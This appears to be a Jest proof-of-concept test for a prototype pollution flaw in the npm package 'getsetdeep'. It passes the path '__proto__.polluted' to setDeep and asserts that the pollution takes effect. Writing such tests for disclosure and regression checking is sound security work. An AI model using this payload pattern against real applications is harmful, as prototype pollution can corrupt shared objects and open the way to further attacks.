test("prototype pollution in getsetdeep", () => {
  const pkg = require("getsetdeep");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  pkg.setDeep(obj, "__proto__.polluted", "yes");

  expect(obj.polluted).toBe("yes");
});
